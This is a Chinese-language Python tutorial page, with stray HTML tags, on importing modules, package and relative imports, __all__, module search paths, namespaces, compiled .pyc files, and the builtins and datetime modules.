# 导入sys模块的argv成员,这个声明不会把整个sys模块导入到当前的命名空间中,只会将sys里的argv单个引入到执行这个声明的模块的全局符号表
from sys import argv
# 使用导入成员的语法,直接使用成员名访问
print(argv[0])

# 导入sys模块的argv成员,并为其指定别名v
from sys import argv as v
# 使用导入成员(并指定别名)的语法,直接使用成员的别名访问
print(v[0])

# 导入sys模块的argv,winver成员
from sys import argv, platform
# 使用导入成员的语法,直接使用成员名访问
print(argv[0])   # ./hello.py
print(platform)  # linux

# 导入sys模块的argv,winver成员,并为其指定别名v、wv
from sys import argv as v, platform as p
# 使用导入成员(并指定别名)的语法,直接使用成员的别名访问
print(v[0])
print(p)

# 一次性导入sys棋块内的所有成员
from sys import *
#使用导入成员的语法,直接使用成员的别名访问
print(argv[0])
print(platform)

# 一次性引入math模块中所有的东西:
from math import *

</textarea><pre>
当解释器遇到import语句,如果模块在当前的搜索路径就会被导入。
一个模块只会被导入一次,不管执行了多少次import,这样可以防止导入模块被一遍又一遍地执行
搜索路径是一个解释器会先进行搜索的所有目录的列表

一般不推荐使用"from 模块 import"这种语法导入指定模块内的所有成员,因为它存在潜在的风险。比如同时导入module1和module2内的所有成员,假如这两个模块内都有一个foo()函数,那么当在程序中执行foo()代码时,调用的这个foo()函数到底是module1模块中的还是module2模块中的？因此这种导入指定模块内所有成员的用法是有风险的。

但如果换成如下两种导入方式:
import module1
import module2 as m2

接下来要分别调用这两个模块中的foo()函数就非常清晰

#使用模块module1的模块名作为前缀调用foo()函数
module1.foo()
#使用module2 的模块别名作为前缀调用foo()函数
m2.foo()

或者使用 from...import 语句也是可以的:

#导入module1 中的foo 成员,并指定其别名为foo1
from module1 import foo as fool
#导入module2 中的foo 成员,并指定其别名为foo2
from module2 import foo as foo2

此时通过别名将module1和module2两个模块中的foo函数很好地进行了区分,接下来分别调用两个模块中foo()函数就很清晰:
foo1() #调用module1 中的foo()函数
foo2() #调用module2 中的foo()函数

3、from . import XXX

</pre><textarea>
sound/                          Top-level package
      __init__.py               Initialize the sound package
      formats/                  Subpackage for file format conversions
              __init__.py
              wavread.py
              wavwrite.py
              aiffread.py
              aiffwrite.py
              auread.py
              auwrite.py

      effects/                  Subpackage for sound effects
              __init__.py
              echo.py
              surround.py
              reverse.py

      filters/                  Subpackage for filters
              __init__.py
              equalizer.py
              vocoder.py
              karaoke.py

</textarea><pre>
from . import echo
在当前文件夹effects里的__init__.py程序中导入echo子模块。

from .. import formats
在上一级文件夹sound里的__init__.py程序中导入formats。

from ..filters import equalizer
在上一级文件夹sound下的filters文件夹里的__init__.py程序中导入equalizer子模块

</pre>相对导入<textarea>
my_package/
    __init__.py
    subpackage1/
        __init__.py
        module_x.py
        module_y.py
    subpackage2/
        __init__.py
        module_z.py
        module_a.py

# my_package/__init__.py
from . import  subpackage1
from . import subpackage2

# my_package/subpackage1/__init__.py
from . import module_x
from . import module_y

# my_package/subpackage1/module_x.py
from .module_y import spam as ham
def main():
    ham()

# my_package/subpackage1/module_y.py
def spam():
    print('spam '* 3)

</textarea>可选导入<textarea>
try:
    from urlparse import urljoin
    from urllib2 import urlopen
except ImportError:
    # Python 3
    from urllib.parse import urljoin
    from urllib.request import urlopen

</textarea><pre>
循环导入
两个模块相互导入对方,那么就会出现循环导入

</pre><textarea>
# a.py
import b
def a_test():
    print("in a_test")
    b.b_test()
a_test()

# b.py
import a
def b_test():
    print('In test_b')
    a.a_test()
b_test()

</textarea><pre>
运行任意一个模块都会引发AttributeError。这是因为这两个模块都在试图导入对方,模块a想要导入模块b,但是因为模块b也在试图导入模块a,这时正在执行,模块a将无法完成模块b的导入。一般来说应该做的是重构代码,避免发生这种情况

覆盖导入
当创建的模块与标准库中的模块同名时,如果导入这个模块就会出现覆盖导入

</pre><pre>
【 __all__变量用法 】
默认情况下如果使用"from 模块名 import *"这样的语句来导入模块,程序会导入该模块中所有不以下画线开头的程序单元
有时候模块中虽然包含很多成员,但并不希望每个成员都被暴露出来供外界使用,此时可借助于模块的__all__变量,将变量的值设置成一个列表,只有该列表中的程序单元才会被暴露出来。

事实上__all__变量的意义在于为模块定义了一个开放的公共接口,通常只有__all__变量列出的程序单元才是希望该模块被外界使用的程序单元。,比如一个实际的大模块可能包含了大量其他程序不需要使用的变量、函数和类,那么通过__all__变量即可把它们自动过滤掉

如果确实希望程序使用模块内__all__列表之外的程序单元,有两种解决方法:
第一种是使用"import 模块名"来导入模块。在通过这种方式导入模块之后,总可以通过模块名或别名前缀来调用模块内的成员。
第二种是使用"from 模块名 import 程序单元"来导入指定程序单元。在这种方式下,即使想导入的程序单元没有位于 __all__ 列表中,也依然可以导入。

</pre><textarea>
'测试__all__变量的模块'
def hello():
    print("Hello, Python")
def world():
    print("Pyhton World is funny")
def test():
    print('--test--')

# 定义__all__变量,指定默认只导入hello和world两个程序单元
__all__ = ['hello', 'world']

# 导入all_module模块内所有成员,由于该模块包含了__all__变量,因此该语句只导入__all__变量所列出的程序单元
from all_module import *
hello()
world()
test()   # NameError: name 'test' is not defined

</textarea>

<h4>自定义模块</h4><pre>
模块就是Python程序,任何Python程序都可作为模块导入,随便写的一个Python程序,其实都可作为模块导入。对于任何程序,只要导入了模块,即可使用该模块内的所有成员。

模块文件的文件名就是它的模块名,比如module1.py的模块名就是module1

</pre>module1.py模块<textarea>
'''
为模块编写说明文档,可通过模块的__doc__属性来访问文档
这是编写的第一个模块,该模块包含以下内容:
my_book:字符串变量
say_hi:简单的函数
User:代表用户的类
'''

# 模块可包含可执行的语句及函数定义,这些语句用于初始化模块,仅在模块第一次在import语句中被导入时执行,当文件被当作脚本运行时它们也会执行
print('这是module 1')
my_book = 'Python入门教程'

def say_hi(user):
    print('%s,您好,欢迎学习Python' % user)

class User:
    '''class User: __init__, walk, __repr__'''
    def __init__(self, name):
        self.name = name
    def walk(self):
        print('%s正在慢慢地走路' % self.name)
    def __repr__(self):
        return 'User[name=%s]' % self.name

'''
为模块编写测试代码
当模块编写完成之后,可能还需要为模块编写一些测试代码,用于测试模块中的每一个程序单元是否都能正常运行
下面代码为module1定义了三个函数,分别用于测试模块中的变量、函数和类,不过这三个函数并没有得到调用的机会。因此如果使用python命令来运行该模块,程序并不会运行它们
对于实际开发的项目,对每个函数、类可能都需要使用更多的测试用例进行测试,这样才能达到各种覆盖效果,比如语句覆盖、条件覆盖等
如果只是简单地调用上面的测试程序则会导致一个问题:当其他程序每次导入该模块时这三个测试函数都会自动运行,这显然不是期望看到的结果。此时希望实现的效果是,如果直接使用python命令运行该模块(相当于测试),程序应该执行该模块的测试函数;如果是其他程序导入该模块,程序不应该执行该模块的测试函数
此时可借助于所有模块内置的__name__变量进行区分,如果直接使用python命令来运行一个模块,name变量的值为__main__;如果该模块被导入其他程序中,__name__ 变量的值就是模块名。因此如果希望测试函数只有在使用python命令直接运行时才执行,则可在调用测试函数时增加判断,只有当 __name__ 属性为 __main__ 时才调用测试函数
'''

# ===以下部分是测试代码===
def test_my_book ():
    print(my_book)
def test_say_hi():
    say_hi('孙悟空')
    say_hi(User('Charlie'))
def test_User():
    u = User('白骨精')
    u.walk()
    print(u)

# 当__name__为'__main__'即直接使用python运行该模块时执行如下代码
if __name__ == '__main__':
    test_my_book()
    test_say_hi()
    test_User()

### test.py文件导入当前目录下自定义模块module1.py,导入模块时会自动执行模块中的可执行代码
# 由于模块其实也是一个Python程序,因此完全可以使用python命令来解释和执行模块程序只要模块中包含可执行代码,如使用python3 module1.py命令来运行模块程序
import module1  # 输出:这是module 1

# 输出模块说明文档
print(module1.__doc__)

# 输出模块中User类的说明文档
print(module1.User.__doc__)  # class User: __init__, walk, __repr__

# 现在可以调用模块里包含的函数了
module1.say_hi("admin")

</textarea>

<h4>加载模块</h4><pre>
'import 模块名'方式导入模块时,为了让Python能找到自定义或第三方提供的模块,可以用以下两种方式来告诉它:

1、使用环境变量
Python将会根据PYTHONPATH环境变量的值来确定到哪里去加载模块。PYTHONPATH环境变量的值是多个路径的集合,这样Python就会依次搜索PYTHONPATH环境变量所指定的多个路径,试图从中找到程序想要加载的模块

在Windows平台上设置环境变量:系统属性->环境变量

在Linux上设置环境变量:~/.bash_profile添加
#设置PYTHON PATH 环境变量
PYTHONPATH=.:/home/yeeku/python_module
#导出PYTHONPATH 环境变量
export PYTHONPATH
多个路径之间以冒号(:)作为分隔符,点.代表当前路径,还有一条路径是/home/yeeku/python_module
由于在PYTHONPATH环境变量中已经添加了点,因此Python程序总可以加载相同路径下的模块,所以import module1可以导入相同路径下的module1模块
重新登录Linux平台或执行source .bash_profile,这两种方式都是为了运行该文件,使在文件中设置的PYTHONPATH变量值生效
在成功设置了上面的环境变量之后,接下来只要把前面定义的模块放在与当前所运行Python程序相同的路径中或放在/home/yeeku/python_module路径下,该模块就能被成功加载了

2、将模块放在默认的模块加载路径下
如果要安装某些通用性模块,比如复数功能支持的模块、矩阵计算支持的模块、图形界面支持的模块等,这些都属于对Python本身进行扩展的模块,这种模块应该直接安装在Python内部,以便被所有程序共享,此时就可借助于Python默认的模块加载路径。

Python默认的模块加载路径由sys.path变量代表,因此可通过在交互式解释器中执行如下命令来查看Python默认的模块加载路径:

import sys
print(sys.path)
['/mnt/e/wamp64/www/study/python', '/usr/lib/python36.zip', '/usr/lib/python3.6', '/usr/lib/python3.6/lib-dynload', '/home/berlin75/.local/lib/python3.6/site-packages', '/usr/local/lib/python3.6/dist-packages', '/usr/lib/python3/dist-packages']

上面的运行结果列出的路径都是Python默认的模块加载路径,但通常来说应该将Python的扩展模块添加在lib\site-packages路径下,它专门用于存放Python的扩展模块和包。

</pre>编写一个Python模块文件,并将该文件复制在lib\site-packages路径下,就相当于为Python扩展了一个print_shape模块,这样任何Python程序都可使用该模块<textarea>
'''
简单的模块,该模块包含以下内容
my_list:保存列表的变量
print_triangle: 使用星号打印三角形的函数
'''
my_list = ['Python', 'Kotlin', 'Swift']
def print_triangle(n):
    '''使用星号打印一个三角形'''
    if n <= 0:
        raise ValueError('n必须大于0')
    for i in range(n):
        print(' ' * (n - i - 1), end='')
        print('*' * (2 * i + 1), end='')
        print('')
# ====以下是测试代码====
def test_print_triangle():
    print_triangle(3)
    print_triangle(4)
    print_triangle(7)
if __name__ == '__main__': test_print_triangle()

</textarea>导入模块的本质<textarea>
'一个简单的测试模块: fkmodule'
print("this is fk_module")
name = 'fkit'
def hello():
    print("Hello, Python")

在相同的路径下定义如下程序来使用该模块:
import fk_module
print("================")
# 打印fk_module的类型
print(type(fk_module))
print(fk_module)

# 输出:
this is fk_module
================
< class 'module'>
< module 'fk_module'from'G:\\publish\\codes\\09\\9.2\\fk_module.py'>
fkit
< function hello at 0x0000000001EABAE8>

'''
从输出结果来看,当程序导入fk_module时该模块中的输出语句会在import时自动执行。该程序中还包含一个与模块同名的变量,该变量的类型是module。
使用"import fk_module"导入模块的本质就是,将fk_module.py中的全部代码加载到内存并执行,然后将整个模块内容赋值给与模块同名的变量,该变量的类型是module,而在该模块中定义的所有程序单元都相当于该module对象的成员
'''

from fk_module import name, hello
print("================")
print(name)
print(hello)
print(fk_module)

# 输出:
this is fk_module
================
fkit
< function hello at 0x0000000001E7BAE8>
Traceback (most recent call last):
  File "fk_module_test2.py", line 22, in < module>
print(fk_module)
NameError: name 'fk_module' is not defined

'''
从输出结果可看出,即使使用from...import只导入模块中部分成员,该模块中的输出语句也会在import时自动执行,这说明Python依然会加载并执行模块中的代码。
使用"from fk_module import name, hello"导入模块中成员的本质就是将fk_module.py中的全部代码加载到内存并执行,然后只导入指定变量、函数等成员单元,并不会将整个模块导入,因此上面程序在输出fk_module时将看到错误提示:name 'fk module' is not defined
'''

</textarea><pre>
在导入模块后可以在模块文件所在目录下看到一个名为"__pycache__"的文件夹,打开该文件夹可以看到Python为每个模块都生成一个*.cpython-36.pyc 文件,比如Python为fk_module模块生成一个fk_ module.cpython-36.pyc文件,该文件其实是Python为模块编译生成的字节码,用于提升该模块的运行效率

【 模块搜索路径 】
试图加载一个模块时,Python会在指定的路径下搜索对应的.py文件,如果找不到就会报错

默认Python解释器会搜索当前目录、所有已安装的内置模块和第三方模块,搜索路径存放在sys模块的path变量中,变量里包含当前目录,PYTHONPATH和由安装过程决定的默认目录
>>> import sys
>>> sys.path
['', '/usr/lib/python36.zip', '/usr/lib/python3.6', '/usr/lib/python3.6/lib-dynload', '/usr/local/lib/python3.6/dist-packages', '/usr/lib/python3/dist-packages']

添加自己的搜索目录有两种方法:
一是直接修改sys.path,添加要搜索的目录,但只在运行时修改,运行结束后失效
>>> import sys
>>> sys.path.append('/Users/michael/my_py_scripts')

二是设置环境变量PYTHONPATH,该环境变量的内容会被自动添加到模块搜索路径中。设置方式与设置Path环境变量类似。只需要添加自己的搜索路径,Python自己本身的搜索路径不受影响

PYTHONPATH变量作为环境变量,PYTHONPATH由装在一个列表里的许多目录组成。PYTHONPATH的语法和shell变量PATH的一样。

在Windows系统,典型的PYTHONPATH如下:
set PYTHONPATH=c:\python27\lib;

在UNIX系统,典型的PYTHONPATH如下:
set PYTHONPATH=/usr/local/lib/python

导入一个模块时Python解析器对模块位置的搜索顺序是:
1、当前目录
2、如果不在当前目录,Python则搜索在shell变量PYTHONPATH下的每个目录。
3、如果都找不到,Python会察看默认路径。UNIX下默认路径一般为/usr/local/lib/python/

当一个名为spam的模块被导入时,解释器首先寻找具有该名称的内置模块。如果没有找到,然后解释器从sys.path变量给出的目录列表里寻找名为spam.py的文件。sys.path初始有这些目录地址:
包含输入脚本的目录(或者未指定文件时的当前目录)。
PYTHONPATH (一个包含目录名称的列表,它和shell变量 PATH 有一样的语法)。
取决于安装的默认设置

在支持符号链接的文件系统上,包含输入脚本的目录是在追加符号链接后才计算出来的。换句话说,包含符号链接的目录并 没有 被添加到模块的搜索路径上。

在初始化后Python程序可以更改sys.path。包含正在运行脚本的文件目录被放在搜索路径的开头处, 在标准库路径之前。这意味着将加载此目录里的脚本,而不是标准库中的同名模块。 除非有意更换,否则这是错误

【 命名空间和作用域 】
变量是拥有匹配对象的名字(标识符),命名空间是一个包含了变量名称们(键)和它们各自相应的对象们(值)的字典。
一个Python表达式可以访问局部命名空间和全局命名空间里的变量,如果一个局部变量和一个全局变量重名则局部变量会覆盖全局变量。
每个函数都有自己的命名空间,类的方法的作用域规则和通常函数的一样。

Python会智能地猜测一个变量是局部的还是全局的,它假设任何在函数内赋值的变量都是局部的,因此如果要给函数内的全局变量赋值,必须使用global语句。
global VarName的表达式会告诉Python VarName是一个全局变量,这样Python就不会在局部命名空间里寻找这个变量了。

</pre>在全局命名空间里定义一个变量Money,再在函数内给变量Money赋值,然后Python会假定Money是一个局部变量。然而并没有在访问前声明一个局部变量Money,结果就是会出现一个UnboundLocalError的错误。取消global语句前的注释符就能解决这个问题<textarea>
Money = 2000
def AddMoney():
   # 想改正代码就取消以下注释:
   # global Money
   Money = Money + 1

print(Money)
AddMoney()
print(Money)

</textarea><pre>
在一个模块中可能会定义很多函数和变量,但有的函数和变量希望给别人使用,有的函数和变量希望仅仅在模块内部使用,在Python中是通过_前缀来实现的。
正常的函数和变量名是公开的public,可以被直接引用,比如abc,x123,PI等

类似__xxx__这样的变量是特殊变量,可被直接引用,但有特殊用途,如__author__、__name__就是特殊变量,模块定义的文档注释也可以用特殊变量__doc__访问,自己的变量一般不要用这种变量名
类似_xxx和__xxx这样的函数或变量就是非公开的(private),不应该被直接引用,而不是"不能"被直接引用,是因为Python并没有一种方法可以完全限制访问private函数或变量,但从编程习惯上不应该引用private函数或变量

</pre><textarea>
def _private_1(name):
    return 'Hello, %s' % name

def _private_2(name):
    return 'Hi, %s' % name

def greeting(name):
    if len(name) > 3:
        return _private_1(name)
    else:
        return _private_2(name)

</textarea><pre>
在模块里公开greeting()函数,而把内部逻辑用private函数隐藏起来了,这样调用greeting()函数不用关心内部的private函数细节,这也是一种非常有用的代码封装和抽象的方法,即:
外部不需要引用的函数全部定义成private,只有外部需要引用的函数才定义为public

【  "编译过的"Python文件 】
为了加速模块载入,Python在__pycache__目录里缓存了每个模块的编译后版本,名称为module.version.pyc,其中名称中的版本字段对编译文件的格式进行编码;它一般使用Python版本号,例如在CPython版本3.3中spam.py的编译版本将被缓存为__pycache__/spam.cpython-33.pyc。此命名约定允许来自不同发行版和不同版本的Python的已编译模块共存。

Python根据编译版本检查源的修改日期,以查看它是否已过期并需要重新编译。这是一个完全自动化的过程。此外编译的模块与平台无关,因此可以在具有不同体系结构的系统之间共享相同的库。

Python在两种情况下不会检查缓存
首先,对于从命令行直接载入的模块,它从来都是重新编译并且不存储编译结果
其次,如果没有源模块,它不会检查缓存。为了支持无源文件(仅编译)发行版本,编译模块必须是在源目录下,并且绝对不能有源模块。

可以在Python命令中使用-O或-OO开关,以减小编译后模块的大小。 -O开关去除断言语句,-OO开关同时去除断言语句和__doc__字符串。由于有些程序可能依赖于这些,应当只在清楚自己在做什么时才使用这个选项。"优化过的"模块有一个opt-标签并且通常小些,将来的发行版本或许会更改优化的效果。

一个从.pyc文件读出的程序并不会比它从.py读出时运行的更快,.pyc文件唯一快的地方在于载入速度。

compileall模块可以为一个目录下的所有模块创建.pyc文件

</pre>

<h4>查看模块(变量、函数、类)方法</h4><pre>
python -m pydoc -p 8899
运行上面命令之后,打开浏览器查看http://localhost:8899/页面,可以在Python安装目录的lib\site-packages下看Matplotlib包的文档

在导入模块之后,开发者往往需要了解模块包含哪些功能,比如包含哪些变量、哪些函数、哪些类等,还希望能查看模块中各成员的帮助信息,掌握这些信息才能正常地使用该模块。

为了查看模块包含什么,可以通过如下两种方式:
1、使用dir()函数
2、使用模块本身提供的__all__变量,但有些模块并不提供__all__变量,AttributeError: module 'math' has no attribute '__all__'

dir()函数返回一个排好序的字符串列表,返回模块或类所包含的全部程序单元(包括变量、函数、类和方法等),但直接使用dir()函数默认会列出模块内所有的程序单元,包括以下画线开头的程序单元,而这些以下画线开头的程序单元其实并不希望被外界使用,所有不以下画线开头的程序单元才是该模块希望被其他程序使用的程序单元

</pre>dir()返回值中特殊字符串变量__name__指向模块的名字,__file__指向该模块的导入文件名<textarea>
# 导入内置math模块
import math
print(dir(math))

# ['__doc__', '__loader__', '__name__', '__package__', '__spec__', 'acos', 'acosh', 'asin', 'asinh', 'atan', 'atan2', 'atanh', 'ceil', 'copysign', 'cos', 'cosh', 'degrees', 'e', 'erf', 'erfc', 'exp', 'expm1', 'fabs', 'factorial', 'floor', 'fmod', 'frexp', 'fsum', 'gamma', 'gcd', 'hypot', 'inf', 'isclose', 'isfinite', 'isinf', 'isnan', 'ldexp', 'lgamma', 'log', 'log10', 'log1p', 'log2', 'modf', 'nan', 'pi', 'pow', 'radians', 'sin', 'sinh', 'sqrt', 'tan', 'tanh', 'tau', 'trunc']

# 为了过滤这些以下画线开头的程序单元,可以使用如下列表推导式来列出模块中的程序单元
print([e for e in dir(math) if not e.startswith('_')])

# ['acos', 'acosh', 'asin', 'asinh', 'atan', 'atan2', 'atanh', 'ceil', 'copysign', 'cos', 'cosh', 'degrees', 'e', 'erf', 'erfc', 'exp', 'expm1', 'fabs', 'factorial', 'floor', 'fmod', 'frexp', 'fsum', 'gamma', 'gcd', 'hypot', 'inf', 'isclose', 'isfinite', 'isinf', 'isnan', 'ldexp', 'lgamma', 'log', 'log10', 'log1p', 'log2', 'modf', 'nan', 'pi', 'pow', 'radians', 'sin', 'sinh', 'sqrt', 'tan', 'tanh', 'tau', 'trunc']

</textarea>模块的__all__属性相当于该模块开放的功能接口,因此也可通过该模块的__all__变量来查看模块内的程序单元<textarea>
import string

print(string.__all__)

# ['ascii_letters', 'ascii_lowercase', 'ascii_uppercase', 'capwords', 'digits', 'hexdigits', 'octdigits', 'printable', 'punctuation', 'whitespace', 'Formatter', 'Template']

</textarea><pre>
【 模块的__doc__属性:查看文档 】
使用help()函数来查看程序单元的帮助信息,如导入string模块之后可使用help()函数来查看指定程序单元的帮助信息

import string
print(help(string))
printhelp(string.capwords)) # 查看string模块下capwords()函数的作用

使用help()函数之所以能查看到程序单元的帮助信息,其实完全是因为该程序单元本身有文档信息,也就是有__doc__属性。换句话说,使用help()函数查看的其实就是程序单元的__doc__属性值

print(string.__doc__)
print(string.capwords.__doc__)

从理论上说,应该为每个程序单元都编写完备而详细的文档信息,这样开发者只要通过help()函数即可查看该程序单元的文档信息,完全不需要查看文档。但不得不说的是,有些程序单元的文档信息并不是很详细,此时可能需要借助于Python库的参考文档:https://docs.python.org/3/library/index.html.

【 模块的__file__属性:查看模块的源文件路径 】
除可以查看模块的帮助信息之外,还可以直接阅读模块的源代码来掌握模块功能,提升Python编程能力。
不管学习哪种编程语言,认真阅读那些优秀的框架、库的源代码都是非常好的学习方法。

通过模块的 __file__ 属性即可查看到指定模块的源文件路径
import string
print(string.__file__)  # /usr/lib/python3.6/string.py

并不是所有模块都是使用Python语言编写的,有些与底层交互的模块可能是用C语言编写的,而且是C程序编译之后的效果,因此这种模块可能没有file属性

import threading
import socket
print(threading)  # < module 'threading' from 'E:\\soft\\python\\lib\\threading.py'>
print(socket)     # < module 'socket' from 'E:\\soft\\python\\lib\\socket.py'>

【 globals()和locals()函数 】
根据调用地方的不同,globals()和locals()函数可被用来返回全局和局部命名空间里的名字。
如果在函数内部调用locals(),返回的是所有能在该函数里访问的命名。
如果在函数内部调用globals(),返回的是所有在该函数里能访问的全局名字。
两个函数的返回类型都是字典,所以名字们能用keys()函数摘取。

【 reload()函数 】
当一个模块被导入到一个脚本,模块顶层部分的代码只会被执行一次。
因此如果想重新执行模块里顶层部分的代码,可以用reload()函数,该函数会重新导入之前导入过的模块
reload(module_name)
module_name要直接放模块的名字,而不是一个字符串形式
reload(hello)  # 重载hello模块
reload(sys)

</pre>
</div>

<div id="builtins">
<h3>内置模块</h3><pre>
Python之所以自称"batteries included",就是因为内置了许多非常有用的模块,无需额外安装和配置,即可直接使用
datatime time calendar random sys os collections base64 struct hashlib hmac urllib html.parser json pickle shelve xml re logging

查看python内部模块命令,内置函数,查看python已经安装的模块命令
可以用 dir(modules)
或者用 pip list
或者用 help('modules')
或者用 python -m pydoc -p 1234
都能列出所有已经安装的模块

</pre>以内建的sys模块为例,编写一个hello的模块<textarea>
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

' a test module '             # 可选的模块的文档注释,任何模块代码的第一个字符串都被视为模块的文档注释

__author__ = 'Michael Liao'   # 可选的作者信息,使用__author__变量把作者写进去,这样公开源代码后别人就可以看到作者的名字

import sys # 使用sys模块的第一步就是导入该模块,导入sys模块后就有了变量sys指向该模块,利用sys这个变量就可以访问sys模块的所有功能

def test():
    args = sys.argv   # sys模块有一个argv变量,用list存储了命令行的所有参数。argv至少有一个元素,因为第一个参数永远是该.py文件的名称
    if len(args)==1:                   # 运行python3 hello.py获得的sys.argv就是['hello.py']
        print('Hello, world!')
    elif len(args)==2:                 # 运行python3 hello.py Michael获得的sys.argv就是['hello.py', 'Michael]
        print('Hello, %s!' % args[1])
    else:
        print('Too many arguments!')

# 命令行运行hello模块文件时Python解释器把一个特殊变量__name__置为__main__,而如果在其他地方导入该hello模块时,if判断将失败,因此这种if测试可以让一个模块通过命令行运行时执行一些额外的代码,最常见的就是运行测试
if __name__=='__main__':
    test()

# 用命令行运行hello.py看看效果:
$ python3 hello.py
Hello, world!
$ python hello.py Michael
Hello, Michael!

# 如果启动Python交互环境,再导入hello模块:
$ python3
>>> import hello # 导入时没有打印Hello, word!,因为没有执行test()函数。
>>> hello.test() # 调用hello.test()时,才能打印出Hello, word!

</textarea><pre>
【 builtins --- 内建对象 】
该模块提供对Python的所有"内置"标识符的直接访问;例如,builtins.open 是内置函数的全名 open()

</pre><textarea>
import builtins
print([e for e in dir(builtins) if not e.startswith('_')])
# ['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', 'abs', 'all', 'any', 'ascii', 'bin', 'bool', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']

</textarea>
</div>

<div id="datetime">
<h4>datetime</h4><pre>
datetime是Python处理日期和时间的标准库
datetime模块还包含一个datetime类,通过from datetime import datetime导入的才是datetime这个类。如果仅导入import datetime则必须引用全名datetime.datetime

datetime表示的时间需要时区信息才能确定一个特定的时间,否则只能视为本地时间。

如果要存储datetime,最佳方法是将其转换为timestamp再存储,因为timestamp的值与时区完全无关

</pre><textarea>
from datetime import datetime

print([e for e in dir(datetime) if not e.startswith('_')])
# ['astimezone', 'combine', 'ctime', 'date', 'day', 'dst', 'fold', 'fromordinal', 'fromtimestamp', 'hour', 'isocalendar', 'isoformat', 'isoweekday', 'max', 'microsecond', 'min', 'minute', 'month', 'now', 'replace', 'resolution', 'second', 'strftime', 'strptime', 'time', 'timestamp', 'timetuple', 'timetz', 'today', 'toordinal', 'tzinfo', 'tzname', 'utcfromtimestamp', 'utcnow', 'utcoffset', 'utctimetuple', 'weekday', 'year']

# datetime.now()返回当前日期和时间,其类型是datetime
now = datetime.now()     # 获取当前datetime
print(now)               # 2019-07-24 18:15:31.718142
print(type(now))         # < class 'datetime.datetime'>

dt = datetime(2015, 4, 19, 12, 20)  # 用指定日期时间创建datetime
print(dt)                           # 2015-04-19 12:20:00

</textarea><textarea>
from datetime import datetime
from datetime import date
import time

d = date(2018, 6, 20)
print(d, type(d)) # 2018-06-20 < class 'datetime.date'>

print(date.today()) # 2018-10-07

print(date.fromtimestamp(time.time())) # 2018-10-07

d1 = date(2018, 10, 7)
s = d1.isoformat()  # 转换为标准格式字符串
print(s, type(s)) # 2018-10-07 < class 'str'>

# 日历显示:(年,第几周,星期)
print(d1.isocalendar())
# 获取星期(1~7)
print(d1.isoweekday())
# 获取星期(0~6)
print(d1.weekday())
# 格式化
print(d1.strftime('%Y/%m/%d'))
# 时间戳转换为类似于元组的形式(localtime)
print(d1.timetuple())

print(datetime(2018, 10, 7, 20,17, 30)) # 2018-10-07 20:17:30
print(datetime.now()) # 2018-10-07 20:19:38.990747
# 此刻的零时区的时间日期
print(datetime.utcnow()) # 2018-10-07 12:26:19.543603
# 将时间戳转换为日期时间
print(datetime.fromtimestamp(time.time())) # 2018-10-07 20:26:19.543604

# 提取日期或时间
dt = datetime(2018, 10, 7, 20,17, 30)
d = dt.date()
print(d) # 2018-10-07
print(dt.time()) # 20:17:30

# 转换为时间戳
dt = datetime(2018, 10, 7, 20,17, 30)
print(dt.timestamp()) # 1538914650.0

# 格式化显示
dt = datetime(2018, 10, 7, 20,17, 30)
print(dt.strftime('%Y/%m/%d %H:%M:%S'))

# 时差:timedalte是datetime中的一个对象,该对象表示两个时间的差值
from datetime import datetime, timedelta

d1 = datetime(2018, 10, 7, 20, 15, 19)
d2 = datetime(2018, 10, 6, 20, 10, 18)
delta = d1 - d2
print(delta) # 1 day, 0:05:01
print(type(delta)) # < class 'datetime.timedelta'>

d1 = datetime(2018, 10, 7, 20, 15, 19)
delta2 = timedelta(days=2, hours=3, minutes=4, seconds=6)
print(delta2) # 2 days, 3:04:06
d3 = d1 + delta2
print(d3) # 2018-10-09 23:19:25
# 天数
print(delta2.days) # 2
# 除天以外的秒数
print(delta2.seconds) # 11046
# 总共的秒数
print(delta2.total_seconds())

</textarea><pre>
datetime转换为timestamp
在计算机中时间实际上是用数字表示的。1970年1月1日 00:00:00 UTC+00:00时区的时刻称为epoch time,记为0(1970年以前的时间timestamp为负数),当前时间就是相对于epoch time的秒数称为timestamp。
Python的timestamp是一个浮点数,如果有小数位,小数位表示毫秒数。

timestamp = 0 = 1970-1-1 00:00:00 UTC+0:00
对应的北京时间是:
timestamp = 0 = 1970-1-1 08:00:00 UTC+8:00

可见timestamp的值与时区毫无关系,因为timestamp一旦确定,其UTC时间就确定了,转换到任意时区的时间也是完全确定的,这就是为什么计算机存储的当前时间是以timestamp表示的,因为全球各地的计算机在任意时刻的timestamp都是完全相同的(假定时间已校准)。

把一个datetime类型转换为timestamp只需要简单调用timestamp()方法:

from datetime import datetime
dt = datetime(2015, 4, 19, 12, 20)  # 用指定日期时间创建datetime
